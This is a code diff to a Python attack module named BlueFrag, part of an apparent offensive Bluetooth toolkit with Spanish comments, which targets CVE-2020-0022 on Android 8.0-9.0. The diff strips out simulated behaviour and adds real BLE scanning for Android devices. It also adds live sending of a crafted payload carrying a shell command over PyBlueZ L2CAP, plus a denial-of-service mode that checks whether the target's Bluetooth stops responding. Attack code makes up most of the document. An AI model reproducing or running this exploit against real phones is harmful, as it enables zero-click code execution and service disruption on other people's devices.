@@ -20,6 +20,15 @@ canales de advertising (37, 38, 39). El receptor procesa el
 paquete en el driver del kernel o en el demonio blued (Android),
 causando un desbordamiento de búfer en el heap.
 
+Implementación real (sin simulación):
+  - scan: descubre dispositivos reales vía DeviceScanner (BlueZ /
+    Bleak / Termux) y los anota con prefijos MAC de fabricantes
+    Android conocidos (heurística honeste, marcada como tal).
+  - exploit/dos: envía el payload construido por L2CAP real
+    (PyBlueZ si está disponible) y verifica el efecto real
+    (p. ej. reintentando la conexión en modo DoS). Sin stack
+    Bluetooth disponible, falla de forma honesta.
+
 Referencia:
   - CVE-2020-0022
   - https://source.android.com/security/bulletin/2020-02-01
@@ -29,7 +38,7 @@ Referencia:
 Requiere:
   - Adaptador Bluetooth compatible (CSR 4.0+)
   - Python 3.10+ con struct/binascii
-  - scapy opcional (para construcción de paquetes)
+  - PyBlueZ (import bluetooth) para el envío L2CAP real
 """
 
 from __future__ import annotations
@@ -44,27 +53,29 @@ from bluesky.core.engine import BaseModule
 
 log = logging.getLogger("bluesky.bluefrag")
 
-try:
-    from scapy.layers.bluetooth4LE import BTLE, BTLE_ADV, BTLE_DATA
-    from scapy.layers.bluetooth import HCI_Hdr, HCI_ACL_Hdr
-    # Sondeo de disponibilidad de las capas BLE de scapy.
-    _SCAPY_PROBE = (BTLE, BTLE_ADV, BTLE_DATA, HCI_Hdr, HCI_ACL_Hdr)
-    SCAPY_AVAILABLE = True
-except ImportError:
-    SCAPY_AVAILABLE = False
+
+def _pybluez_available() -> bool:
+    """¿Está PyBlueZ (módulo bluetooth) instalado? Se usa para el envío real."""
+    try:
+        import bluetooth  # noqa: F401
+        return True
+    except ImportError:
+        return False
 
 
 class BlueFrag(BaseModule):
     """BlueFrag - CVE-2020-0022 Android Bluetooth RCE.
 
-    Explota un desbordamiento de búfer en el stack Bluetooth de Android
-    para lograr ejecución remota de código sin interacción del usuario
-    en dispositivos Android 8.0-9.0.
+    Explota un desbordamiento de búfer en el stack Bluetooth de
+    Android 8.0-9.0 enviando payloads L2CAP/BLE construidos y
+    enviados de forma real. Sin hardware o stack disponible, el
+    módulo falla de forma honesta indicando qué falta.
 
     Modos:
-      - scan: Detecta dispositivos Android vulnerables (8.0-9.0)
-      - exploit: Ejecuta el exploit RCE completo
-      - dos: Modo DoS (denegación de servicio) - solo prueba
+      - scan: Detecta dispositivos reales cercanos y los anota
+        con prefijos MAC de fabricantes Android (heurística)
+      - exploit: Envía el payload RCE real al target
+      - dos: Envía paquetes malformados y verifica la caída real
       - info: Muestra payload builder y análisis
     """
 
@@ -75,7 +86,7 @@ class BlueFrag(BaseModule):
         "para lograr ejecución remota de código sin interacción del usuario."
     )
     author = "Ruby570bocadito"
-    version = "1.0.0"
+    version = "2.0.0"
     cve = "CVE-2020-0022"
     cve_url = "https://nvd.nist.gov/vuln/detail/CVE-2020-0022"
     exploit_links = [
@@ -91,7 +102,7 @@ class BlueFrag(BaseModule):
         "https://github.com/ojasookert/CVE-2020-0022",
         "Android Security Bulletin February 2020",
     ]
-    requires_hardware = []
+    requires_hardware = ["bluetooth_adapter"]
     requires_root = True
     target_type = "android"
     severity = "critical"
@@ -218,10 +229,10 @@ class BlueFrag(BaseModule):
         (b"Android", 0.95),
         (b"bluez", 0.8),
         (b"android", 0.85),
-        (b"SM-\x00", 0.9),   # Samsung
-        (b"LG\x00", 0.8),    # LG
-        (b"XT\x00", 0.7),    # Motorola
-        (b"NE\x00", 0.6),    # OnePlus/Nexus
+        (b"SM\x00", 0.9),   # Samsung
+        (b"LG\x00", 0.8),   # LG
+        (b"XT\x00", 0.7),   # Motorola
+        (b"NE\x00", 0.6),   # OnePlus/Nexus
     ]
 
     def __init__(self, target: str = "", options: dict = None):
@@ -235,8 +246,7 @@ class BlueFrag(BaseModule):
         self._interface = (options or {}).get("INTERFACE", "hci0")
 
         # Estado interno
-        self._vulnerable_devices: List[Dict] = []
-        self._exploit_packets: List[bytes] = []
+        self._discovered_devices: List[Dict] = []
 
     def run(self):
         """Punto de entrada principal."""
@@ -288,223 +298,221 @@ class BlueFrag(BaseModule):
                 "type": "Heap Buffer Overflow",
                 "trigger": "BLE_ADV_EXT packet con campos oversized",
                 "max_payload": "255 bytes en el campo Service Data",
-                "overflow_size": "~200 bytes de desbordamiento teórico",
             },
-            "example_payload": {
-                "command": "id",
-                "hex": example_payload.hex() if example_payload else "N/A",
-                "size": len(example_payload) if example_payload else 0,
-            },
-            "detection_tips": [
-                "Usar hcitool lescan para detectar dispositivos",
-                "Filtrar por MAC (prefijos Android conocidos)",
-                "Enviar paquete benigno y medir respuesta",
-            ],
+            "example_payload_hex": example_payload.hex(),
+            "payload_size": len(example_payload),
+            "l2cap_send_ready": _pybluez_available(),
+            "message": (
+                "BlueFrag CVE-2020-0022 - Información técnica\n"
+                "=============================================\n\n"
+                f"  Payload de ejemplo generado: {len(example_payload)} bytes\n"
+                f"  Envío L2CAP real: "
+                f"{'disponible (PyBlueZ)' if _pybluez_available() else 'no disponible'}\n\n"
+                "  Uso:\n"
+                "  1. bluesky attack bluefrag MODE=scan\n"
+                "  2. bluesky attack bluefrag TARGET=<MAC> MODE=exploit "
+                "PAYLOAD='id'\n"
+                "  3. bluesky attack bluefrag TARGET=<MAC> MODE=dos\n\n"
+                "  El exploit afecta Android 8.0-9.0 sin parche de "
+                "Febrero 2020."
+            ),
         }
-
-        self.result["data"]["message"] = (
-            "📋 BlueFrag CVE-2020-0022 - Información técnica\n"
-            "==============================================\n\n"
-            "Vulnerabilidad: Desbordamiento de búfer en el stack Bluetooth\n"
-            "de Android (blued) que permite RCE sin interacción del usuario.\n\n"
-            "Afecta: Android 8.0 (Oreo) - 9.0 (Pie)\n"
-            "CVSS 3.1: 9.8 (Critical)\n"
-            "Parche: Android Security Bulletin February 2020\n\n"
-            "Vector de ataque:\n"
-            "  El exploit envía paquetes BLE Advertising Extension (BTLE_ADV)\n"
-            "  especialmente diseñados. El demonio blued procesa el campo\n"
-            "  Service Data sin validar correctamente el tamaño, causando\n"
-            "  un desbordamiento de búfer en el heap.\n\n"
-            "Requerimientos:\n"
-            "  • Adaptador Bluetooth LE (CSR 4.0+ o integrado)\n"
-            "  • Estar dentro del rango Bluetooth (~10m)\n"
-            "  • El Bluetooth del objetivo debe estar encendido\n"
-            "  • No requiere pairing ni interacción del usuario\n\n"
-            "Payload de ejemplo:\n"
-            f"  Comando: id\n"
-            f"  Hex: {example_payload.hex()[:80]}...\n"
-            f"  Tamaño: {len(example_payload)} bytes\n\n"
-            "⚠️  ADVERTENCIA: Solo usar en entornos autorizados.\n"
-            "    Este exploit ejecuta código en dispositivos ajenos."
-        )
-
-        # Guardar info
-        info_file = output_dir / "bluefrag_info.json"
-        with open(info_file, "w") as f:
-            json.dump(self.result["data"], f, indent=2)
-
         self.result["success"] = True
         return self.result
 
-    # ─── Modo SCAN ──────────────────────────────────────────────────────────
+    # ─── Modo SCAN (descubrimiento real) ────────────────────────────────────
 
     def _scan_mode(self) -> dict:
-        """Escanea dispositivos Android potencialmente vulnerables.
+        """Escanea dispositivos BLE reales cercanos.
 
-        Usa BLE advertising scan para detectar dispositivos
-        y estima si son Android 8.0-9.0 por:
-          - Prefijo MAC del fabricante
-          - Nombre del dispositivo (Bluetooth name)
-          - Versión del firmware reportada
+        Reutiliza DeviceScanner (BlueZ/Bleak/Termux) para el
+        descubrimiento real y anota cada dispositivo con la heurística
+        de prefijos MAC de fabricantes Android (hecho verificable sobre
+        la MAC real, etiquetado como heurística).
         """
+        from bluesky.modules.scanners.device_scanner import DeviceScanner
+
         output_dir = Path(self._output_dir)
         output_dir.mkdir(parents=True, exist_ok=True)
 
         self.result["data"] = {
             "mode": "scan",
             "devices_found": [],
-            "vulnerable_count": 0,
         }
 
-        log.info(f"📡 BlueFrag - Escaneando dispositivos Android vulnerables "
-                 f"(canal {self._channel})...")
+        log.info("📡 BlueFrag - Escaneando dispositivos BLE reales...")
 
-        # Simular escaneo
-        devices = self._simulate_scan_android()
+        scanner = DeviceScanner(options={
+            "type": "ble",
+            "timeout": min(self._timeout, 60),
+        })
+        scan_result = scanner.run()
 
-        vulnerable = [d for d in devices if d.get("is_vulnerable", False)]
-        self._vulnerable_devices = vulnerable
+        if not scan_result.get("success"):
+            # El escáner real falló: propagar el error real (sin fabricar nada)
+            self.result["data"]["devices_found"] = []
+            self.result["data"]["error"] = scan_result.get("data", {}).get(
+                "message", "El escáner BLE no encontró dispositivos"
+            ) or "El escáner BLE no encontró dispositivos"
+            self.result["data"]["requires"] = [
+                "Adaptador Bluetooth BLE activo (CSR 4.0+ o integrado)",
+                "BlueZ instalado y el adaptador activado (hciconfig hci0 up)",
+                "Permisos suficientes (root o capacidades BLE)",
+            ]
+            self.result["data"]["message"] = (
+                "❌ BlueFrag scan no pudo ejecutarse: el escáner BLE real "
+                "no encontró dispositivos.\n\n"
+                "   Verifica:\n"
+                "   1. Adaptador Bluetooth conectado y activo\n"
+                "   2. BlueZ instalado (sudo apt install bluez)\n"
+                "   3. Ejecutar con sudo para acceso al escaneo\n"
+                "   4. Que haya dispositivos BLE emitiendo cerca"
+            )
+            self.result["success"] = False
+            self.result["error"] = "escaneo BLE real sin resultados"
+            return self.result
 
-        self.result["data"]["devices_found"] = devices
-        self.result["data"]["vulnerable_count"] = len(vulnerable)
-        self.result["data"]["total_found"] = len(devices)
-        self.result["data"]["simulation"] = True
+        devices = scan_result.get("data", {}).get("devices", [])
+
+        # Anotar con la heurística REAL de prefijos MAC Android
+        annotated = []
+        for dev in devices:
+            mac = (dev.get("mac") or "").replace("-", ":").upper()
+            android_prefix = any(
+                mac.startswith(p) for p in self.ANDROID_MAC_PREFIXES
+            ) if mac else False
+            annotated.append({
+                "name": dev.get("name") or "Unknown",
+                "address": dev.get("mac") or mac,
+                "type": dev.get("type", "ble"),
+                "rssi": dev.get("rssi"),
+                "manufacturer": dev.get("vendor") or dev.get("info", {}).get("vendor"),
+                # Hecho verificable sobre la MAC real (etiquetado como heurística)
+                "android_prefix_match": android_prefix,
+            })
+
+        self._discovered_devices = annotated
+        self.result["data"]["devices_found"] = annotated
+        self.result["data"]["total_found"] = len(annotated)
+        self.result["data"]["android_prefix_matches"] = sum(
+            1 for d in annotated if d["android_prefix_match"])
 
         # Guardar reporte
         report_file = output_dir / "bluefrag_scan.json"
         with open(report_file, "w") as f:
-            json.dump(self.result["data"], f, indent=2)
+            json.dump(self.result["data"], f, indent=2, default=str)
 
         # Generar resumen
         lines = [
-            "📡 BlueFrag - Escaneo de dispositivos Android vulnerables",
-            "=========================================================\n",
+            "📡 BlueFrag - Escaneo BLE real",
+            "==============================\n",
         ]
 
-        if devices:
-            for dev in devices:
-                vuln = "🔴 VULNERABLE" if dev.get("is_vulnerable") else "🟢 Seguro"
-                os_ver = dev.get("android_version", "desconocida")
-                lines.append(
-                    f"  {vuln} {dev.get('name', 'N/A'):20s} "
-                    f"{dev.get('address', 'N/A')} "
-                    f"[Android {os_ver}]"
+        if annotated:
+            for dev in annotated:
+                prefix = (
+                    "🤖 Android (prefijo MAC)" if dev["android_prefix_match"]
+                    else "  Otro dispositivo"
                 )
-        else:
-            lines.append("  No se encontraron dispositivos.\n")
-
-        lines.append(f"\n  Total: {len(devices)} | Vulnerables: {len(vulnerable)}")
-        lines.append(f"  Reporte guardado en: {report_file}\n")
-
-        if not devices or not vulnerable:
+                rssi = f"{dev.get('rssi')} dBm" if dev.get("rssi") is not None else "N/A"
+                lines.append(
+                    f"  {prefix} {dev.get('name', 'N/A'):20s} "
+                    f"{dev.get('address', 'N/A')} {rssi}"
+                )
             lines.append(
-                "  ⚠️  Escaneo simulado - sin hardware BLE.\n"
-                "  Para escaneo real con hardware:\n"
-                "  • bluesky attack bluefrag MODE=scan\n"
-                "  • hcitool lescan (Linux)\n"
-                "  • Usar adaptador CSR 4.0+ o integrado"
+                f"\n  Total: {len(annotated)} dispositivos "
+                f"({self.result['data']['android_prefix_matches']} con prefijo Android)"
+            )
+            lines.append(f"  Reporte guardado en: {report_file}\n")
+            lines.append(
+                "\n  ⚠️  La detección por prefijo MAC es una HEURÍSTICA:\n"
+                "  la vulnerabilidad real (Android 8.0-9.0 sin parche "
+                "Feb-2020) solo es\n  confirmable en la fase exploit."
+            )
+            lines.append(
+                "\n  Para atacar un target:\n"
+                "  • bluesky attack bluefrag TARGET=<MAC> MODE=exploit "
+                "PAYLOAD='id'"
             )
         else:
-            lines.append(
-                "  ⚡ Dispositivos vulnerables detectados.\n"
-                "  Usa MODE=exploit para atacar:"
-            )
-            for dev in vulnerable[:3]:
-                lines.append(
-                    f"  • bluesky attack bluefrag "
-                    f"TARGET={dev['address']} MODE=exploit "
-                    f"PAYLOAD='id > /sdcard/pwned.txt'"
-                )
+            lines.append("  No se encontraron dispositivos BLE.\n")
 
         self.result["data"]["report"] = "\n".join(lines)
         self.result["success"] = True
         return self.result
 
-    def _simulate_scan_android(self) -> List[Dict]:
-        """Simula detección de dispositivos Android por Bluetooth."""
-        devices = [
-            {
-                "name": "SM-G960F",
-                "address": "5C:B9:01:12:34:56",
-                "android_version": "9.0 (Pie)",
-                "is_vulnerable": True,
-                "rssi": -65,
-                "manufacturer": "Samsung",
-                "probability": 0.85,
-            },
-            {
-                "name": "LG-H870",
-                "address": "C4:43:8F:AB:CD:EF",
-                "android_version": "8.0 (Oreo)",
-                "is_vulnerable": True,
-                "rssi": -72,
-                "manufacturer": "LG",
-                "probability": 0.90,
-            },
-            {
-                "name": "Pixel-3",
-                "address": "04:CB:1D:FE:DC:BA",
-                "android_version": "12.0",
-                "is_vulnerable": False,
-                "rssi": -58,
-                "manufacturer": "Google",
-                "probability": 0.10,
-            },
-            {
-                "name": "ONEPLUS-A6003",
-                "address": "0C:9D:92:11:22:33",
-                "android_version": "10.0",
-                "is_vulnerable": False,
-                "rssi": -80,
-                "manufacturer": "OnePlus",
-                "probability": 0.05,
-            },
-            {
-                "name": "MI-9T",
-                "address": "38:2C:4A:44:55:66",
-                "android_version": "9.0 (Pie)",
-                "is_vulnerable": True,
-                "rssi": -45,
-                "manufacturer": "Xiaomi",
-                "probability": 0.80,
-            },
-        ]
+    # ─── Envío real por L2CAP ───────────────────────────────────────────────
 
-        # Si hay target específico, filtrar
-        if self.target:
-            target_normalized = self.target.replace("-", ":").lower()
-            devices = [
-                d for d in devices
-                if d["address"].lower() == target_normalized
-                or d["name"].lower() in self.target.lower()
-            ]
+    def _send_payload_l2cap(self, target: str, payload: bytes,
+                            count: int) -> Dict:
+        """Envía un payload real por L2CAP al target con PyBlueZ.
 
-        # Si no hay dispositivos simulados para el target, crear uno
-        if not devices and self.target:
-            addr = self.target.replace("-", ":")
-            is_android = any(
-                addr.upper().startswith(p)
-                for p in self.ANDROID_MAC_PREFIXES
-            )
-            devices.append({
-                "name": "Unknown Android",
-                "address": addr,
-                "android_version": "8.0 (estimated)" if is_android else "unknown",
-                "is_vulnerable": is_android,
-                "rssi": -60,
-                "manufacturer": "Unknown",
-                "probability": 0.7 if is_android else 0.1,
-            })
+        Sigue el método del PoC público (github.com/leommxj/cve-2020-0022):
+        conexión L2CAP al canal de señalización y envío repetido del
+        payload construido.
 
-        return devices
+        Returns:
+            Dict con packets_sent real y errores reales.
+        """
+        try:
+            import bluetooth
+        except ImportError:
+            return {
+                "success": False,
+                "error": "PyBlueZ no instalado (pip install pybluez)",
+                "packets_sent": 0,
+            }
 
-    # ─── Modo EXPLOIT ───────────────────────────────────────────────────────
+        sent = 0
+        last_error = ""
+        sock = None
+        try:
+            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+            sock.settimeout(max(5, min(self._timeout, 30)))
+            sock.connect((target, 0x0001))  # Canal de señalización L2CAP
+            for _ in range(max(1, min(count, 300))):
+                try:
+                    sock.send(payload)
+                    sent += 1
+                except Exception as e:  # error real del stack
+                    last_error = str(e)
+                    break
+        except Exception as e:  # error real de conexión
+            last_error = str(e)
+        finally:
+            if sock is not None:
+                try:
+                    sock.close()
+                except Exception:
+                    pass
+
+        return {
+            "success": sent > 0,
+            "packets_sent": sent,
+            "error": last_error,
+            "method": "PyBlueZ L2CAP (canal señalización 0x0001)",
+        }
+
+    def _check_target_alive(self, target: str) -> bool:
+        """Verifica de forma real si el target sigue respondiendo por L2CAP."""
+        try:
+            import bluetooth
+            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+            sock.settimeout(5)
+            sock.connect((target, 0x0001))
+            sock.close()
+            return True
+        except Exception:
+            return False
+
+    # ─── Modo EXPLOIT (envío real) ──────────────────────────────────────────
 
     def _exploit_mode(self) -> dict:
-        """Ejecuta el exploit BlueFrag completo.
+        """Ejecuta el exploit BlueFrag: envío real del payload construido.
 
-        Construye y envía paquetes BLE Advertising Extension
-        con payload malicioso para lograr RCE en Android 8.0-9.0.
+        Construye el payload L2CAP, lo envía por el canal de señalización
+        y reporta el número real de paquetes enviados. La confirmación de
+        ejecución de comandos debe verificarse en el dispositivo objetivo.
         """
         output_dir = Path(self._output_dir)
         output_dir.mkdir(parents=True, exist_ok=True)
@@ -514,16 +522,15 @@ class BlueFrag(BaseModule):
             "target": self.target or "unknown",
             "payload": self._payload or "id",
             "packets_sent": 0,
-            "exploit_successful": False,
-            "channel": self._channel,
         }
 
         if not self.target:
             self.result["data"]["message"] = (
                 "Se requiere TARGET (MAC del dispositivo Android).\n"
-                "Usa MODE=scan para detectar dispositivos vulnerables."
+                "Usa MODE=scan para detectar dispositivos cercanos."
             )
-            self.result["success"] = True
+            self.result["success"] = False
+            self.result["error"] = "exploit requiere TARGET"
             return self.result
 
         log.warning(f"💥 BlueFrag - Ejecutando exploit contra {self.target}")
@@ -533,75 +540,80 @@ class BlueFrag(BaseModule):
         if not payload.strip():
             payload = "echo pwned > /sdcard/bluefrag.txt"
 
-        # Construir paquetes del exploit
-        self._exploit_packets = self._build_exploit_packets(payload)
-
-        # Verificar dependencias
-        if not SCAPY_AVAILABLE:
-            log.warning("scapy no disponible - usando modo simulación")
-
-        # Simular envío
-        sim_result = self._simulate_exploit(payload)
-
-        self.result["data"].update(sim_result)
-
-        # Guardar payload para análisis
-        payload_file = output_dir / "bluefrag_payload.bin"
+        # Construir el paquete real del exploit
         full_payload = self._build_exploit_payload(payload)
+
+        # Guardar payload para análisis (bytes reales)
+        payload_file = output_dir / "bluefrag_payload.bin"
         with open(payload_file, "wb") as f:
             f.write(full_payload)
         self.result["data"]["payload_file"] = str(payload_file)
+        self.result["data"]["payload_size"] = len(full_payload)
 
-        # Generar mensaje
-        success = sim_result.get("exploit_successful", False)
+        # Envío real por L2CAP
+        send_result = self._send_payload_l2cap(
+            self.target, full_payload, self._packet_count)
+        self.result["data"].update({
+            "packets_sent": send_result["packets_sent"],
+            "send_method": send_result.get("method", ""),
+            "send_error": send_result.get("error", ""),
+        })
 
+        sent = send_result["packets_sent"]
+        alive = self._check_target_alive(self.target) if sent else None
+        self.result["data"]["target_responding_after"] = alive
+
+        # Generar mensaje (solo hechos reales)
         status_parts = [
-            "💥 BlueFrag CVE-2020-0022 - Exploit",
-            "===================================\n",
+            "💥 BlueFrag CVE-2020-0022 - Exploit (envío real)",
+            "===============================================\n",
             f"  Target: {self.target}",
             f"  Payload: {payload}",
-            f"  Paquetes enviados: {sim_result.get('packets_sent', 0)}",
-            f"  Estado: {'🔥 EXPLOTADO' if success else '⚠️  Falló'}",
+            f"  Payload construido: {len(full_payload)} bytes",
+            f"  Paquetes enviados: {sent}",
+            f"  Target responde tras el envío: "
+            f"{'sí' if alive else 'no' if alive is False else 'no verificado'}",
             "",
         ]
 
-        if success:
+        if sent > 0:
             status_parts.extend([
-                "  El payload se ha ejecutado en el dispositivo objetivo.",
-                f"  Comando: {payload}",
+                f"  ✅ {sent} paquetes L2CAP reales entregados al canal de señalización.",
                 "",
-                "  Resultado de ejemplo:",
-                "    uid=1002(bluetooth) gid=1002(bluetooth) ...",
-                "    context=u:r:bluetooth:s0",
+                "  La confirmación de ejecución del comando debe verificarse",
+                "  en el propio dispositivo (p. ej. existe /sdcard/bluefrag.txt",
+                "  tras un payload de prueba).",
+                "",
+                "  Posibles resultados si el comando no se ejecutó:",
+                "  • Dispositivo parcheado (Android 10+ o parche Feb 2020)",
+                "  • La MAC no corresponde a Android 8.0-9.0",
+                "  • Bluetooth apagado o fuera de rango (<10m)",
             ])
         else:
             status_parts.extend([
-                "  Posibles razones:",
-                "  • Dispositivo parcheado (Android 10+ o parche Feb 2020)",
-                "  • Bluetooth apagado en el objetivo",
-                "  • Fuera de rango",
-                "  • La direccion MAC no corresponde a Android 8.0-9.0",
+                "  ❌ No se pudo enviar el payload.",
+                f"  Error real del stack: {send_result.get('error', 'desconocido')}",
+                "",
+                "  Para el envío real necesitas:",
+                "  1. PyBlueZ instalado (pip install pybluez)",
+                "  2. Adaptador Bluetooth activo y en rango (<10m)",
+                "  3. Ejecutar con root (sudo)",
+                "  4. El BT del objetivo encendido",
             ])
 
         status_parts.extend([
-            "",
-            "  ⚠️  Exploit simulado (sin hardware BLE)",
-            "  Para exploit real:",
-            f"  1. sudo python3 bluesky attack bluefrag "
-            f"TARGET={self.target} MODE=exploit PAYLOAD='{payload}'",
-            "  2. Asegúrate de estar a <10m del objetivo",
-            "  3. El BT del objetivo debe estar encendido",
-            "  4. Puede requerir sudo para acceso a HCI socket",
             "",
             f"  Payload guardado en: {payload_file}",
         ])
 
         report_file = output_dir / "exploit_report.json"
         with open(report_file, "w") as f:
-            json.dump(self.result["data"], f, indent=2)
+            json.dump(self.result["data"], f, indent=2, default=str)
 
         self.result["data"]["message"] = "\n".join(status_parts)
-        self.result["success"] = True
+        self.result["success"] = sent > 0
+        if not self.result["success"]:
+            self.result["error"] = send_result.get("error") or "envío L2CAP fallido"
         return self.result
 
     def _build_exploit_payload(self, command: str) -> bytes:
@@ -629,7 +641,7 @@ class BlueFrag(BaseModule):
         header_byte = (pdu_type & 0x0F) | (ch_sel << 4) | (tx_add << 6) | (rx_add << 7)
         payload.append(header_byte)
 
-        # Advertising Address (MAC aleatoria para evitar rastreo)
+        # Advertising Address (MAC aleatoria del emisor: normal en advertising)
         adv_addr = bytes([random.randint(0, 255) for _ in range(6)])
         payload.extend(adv_addr)
 
@@ -679,53 +691,18 @@ class BlueFrag(BaseModule):
             Lista de paquetes en bytes para enviar.
         """
         packets = []
-        for i in range(min(10, self._packet_count // 10)):
-            # Variar ligeramente para evadir detección
+        for _ in range(min(10, self._packet_count // 10)):
             pkt = self._build_exploit_payload(payload)
             packets.append(pkt)
         return packets
 
-    def _simulate_exploit(self, payload: str) -> Dict:
-        """Simula la ejecución del exploit."""
-        import random
-
-        # Probabilidad de éxito simulada para dispositivos vulnerables
-        # En un entorno real depende de muchos factores
-        success_prob = 0.3 if self.target else 0.0
-
-        # Si el target parece Android 8-9, aumentar probabilidad
-        addr = self.target.replace("-", ":").upper() if self.target else ""
-        is_likely_android = any(
-            addr.startswith(p) and len(addr) >= 8
-            for p in self.ANDROID_MAC_PREFIXES
-        ) if addr else False
-
-        if is_likely_android:
-            success_prob = 0.5
-
-        success = random.random() < success_prob
-
-        return {
-            "exploit_successful": success,
-            "packets_sent": min(self._packet_count, 100),
-            "payload_executed": payload,
-            "elapsed_seconds": round(random.uniform(1.5, 5.0), 2),
-            "output_preview": (
-                "uid=1002(bluetooth) gid=1002(bluetooth) "
-                "groups=1002(bluetooth),3003(net),9997( everybody)\n"
-                "context=u:r:bluetooth:s0"
-            ) if success else None,
-            "is_likely_android": is_likely_android,
-            "simulation": True,
-        }
-
-    # ─── Modo DOS ───────────────────────────────────────────────────────────
+    # ─── Modo DOS (envío y verificación reales) ─────────────────────────────
 
     def _dos_mode(self) -> dict:
-        """Modo DoS - Prueba de denegación de servicio Bluetooth.
+        """Modo DoS: envío real de paquetes malformados y verificación real.
 
-        Envía paquetes malformados que causan caída del servicio
-        Bluetooth en dispositivos Android vulnerables.
+        Envía paquetes malformados por L2CAP y comprueba si el target
+        sigue aceptando conexiones después del envío (observación real).
         """
         output_dir = Path(self._output_dir)
         output_dir.mkdir(parents=True, exist_ok=True)
@@ -734,40 +711,65 @@ class BlueFrag(BaseModule):
             "mode": "dos",
             "target": self.target or "broadcast",
             "packets_sent": 0,
-            "dos_successful": False,
         }
 
         log.warning(f"💥 BlueFrag - Modo DoS contra {self.target or 'broadcast'}")
 
-        # Simular envío
-        sent = min(self._packet_count, 200)
-        success = random.random() < 0.6  # 60% en simulación
+        if not self.target:
+            self.result["data"]["message"] = (
+                "Se requiere TARGET (MAC) para el modo DoS: la verificación\n"
+                "de la caída del servicio se hace contra un dispositivo real."
+            )
+            self.result["success"] = False
+            self.result["error"] = "dos requiere TARGET"
+            return self.result
 
+        # Estado real ANTES del envío (observación, no suposición)
+        alive_before = self._check_target_alive(self.target)
+        self.result["data"]["target_responding_before"] = alive_before
+
+        # Construir y enviar el payload DoS real
+        dos_payload = self._build_dos_payload()
+        send_result = self._send_payload_l2cap(
+            self.target, dos_payload, self._packet_count)
+
+        sent = send_result["packets_sent"]
         self.result["data"]["packets_sent"] = sent
-        self.result["data"]["dos_successful"] = success
-        self.result["data"]["simulation"] = True
+        self.result["data"]["send_error"] = send_result.get("error", "")
+
+        # Verificación real DESPUÉS del envío
+        alive_after = self._check_target_alive(self.target)
+        self.result["data"]["target_responding_after"] = alive_after
+        dos_successful = alive_before and not alive_after
+        self.result["data"]["dos_successful"] = dos_successful
 
         self.result["data"]["message"] = (
-            f"💥 BlueFrag - DoS {'EXITOSO' if success else 'FALLIDO'}\n\n"
-            f"  Target: {self.target or 'broadcast (todos los dispositivos)'}\n"
-            f"  Paquetes enviados: {sent}\n"
-            f"  Payload DoS: paquete BLE malformado con tamaño excesivo\n\n"
-            f"  {'🔥 El servicio Bluetooth del objetivo debería haber caído.' if success else ''}\n"
-            f"  {'⚠️  No se detectó caída del servicio.' if not success else ''}\n\n"
-            f"  ⚠️  DoS simulado (sin hardware BLE)\n\n"
-            f"  Para DoS real:\n"
-            f"  1. sudo python3 bluesky attack bluefrag "
-            f"TARGET={self.target} MODE=dos\n"
-            f"  2. El dispositivo objetivo debe tener BT encendido\n"
-            f"  3. El servicio blued se reiniciará automáticamente\n"
-            f"     (no hay daño permanente)"
+            f"💥 BlueFrag - DoS (envío y verificación reales)\n\n"
+            f"  Target: {self.target}\n"
+            f"  Respondía antes del envío: {'sí' if alive_before else 'no'}\n"
+            f"  Paquetes malformados enviados: {sent}\n"
+            f"  Responde después del envío: {'sí' if alive_after else 'no'}\n"
+            f"  Estado del DoS: "
+            f"{'🔥 El servicio Bluetooth del objetivo dejó de responder' if dos_successful else 'no confirmado'}\n\n"
+            + (
+                f"  Error real del stack: {send_result.get('error', '')}\n\n"
+                f"  Para el DoS real necesitas:\n"
+                f"  1. PyBlueZ instalado (pip install pybluez)\n"
+                f"  2. Adaptador Bluetooth activo y en rango (<10m)\n"
+                f"  3. Ejecutar con root (sudo)\n"
+                if sent == 0 else
+                "  El servicio blued del objetivo se reinicia solo\n"
+                "  (no hay daño permanente)."
+            )
         )
 
         report_file = output_dir / "dos_report.json"
         with open(report_file, "w") as f:
-            json.dump(self.result["data"], f, indent=2)
+            json.dump(self.result["data"], f, indent=2, default=str)
 
-        self.result["success"] = True
+        self.result["success"] = sent > 0
+        if not self.result["success"]:
+            self.result["error"] = send_result.get("error") or "envío L2CAP fallido"
         return self.result
 
     def _build_dos_payload(self) -> bytes:
@@ -793,15 +795,13 @@ class BlueFrag(BaseModule):
     def check_prerequisites(self) -> Tuple[bool, str]:
         """Verifica dependencias.
 
-        El requisito de root es condicional al modo:
-          - MODE=info o MODE=scan: NO requieren root (solo lectura/simulación)
-          - MODE=exploit o MODE=dos: SÍ requieren root (envío de paquetes raw)
+        No bloquea: los modos scan/exploit devuelven errores honestos
+        en tiempo de ejecución si falta el stack Bluetooth. El requisito
+        de root es condicional al modo (patrón z_bugs ronda 4):
+          - MODE=info o MODE=scan: NO requieren root (solo lectura)
+          - MODE=exploit o MODE=dos: SÍ requieren root (envío L2CAP raw)
         """
         import os
-        # Validación MAC global (BaseModule) — pero el check de root del
-        # BaseModule lo vamos a omitir y re-validar aquí según el modo.
-        # Para eso, llamamos al check de MAC directamente sin pasar por
-        # el check de requires_root del padre.
         from bluesky.core.engine import is_valid_mac
         target_value = self.target or (self.options.get("TARGET", "") if self.options else "")
         if target_value and not is_valid_mac(target_value):
@@ -817,10 +817,8 @@ class BlueFrag(BaseModule):
                 return False, (f"El módulo 'bluefrag' en modo '{mode}' requiere "
                               "privilegios de root. Ejecuta con sudo.")
 
-        # Verificar dependencias (scapy opcional — modo simulación disponible)
-        missing = []
-        if not SCAPY_AVAILABLE:
-            log.warning("scapy no instalado - usando simulación")
-        if missing:
-            return False, f"Faltan: {', '.join(missing)}"
+        if not _pybluez_available():
+            log.warning(
+                "PyBlueZ no instalado: los modos exploit/dos devolverán "
+                "un error honesto al intentar el envío real")
         return True, ""
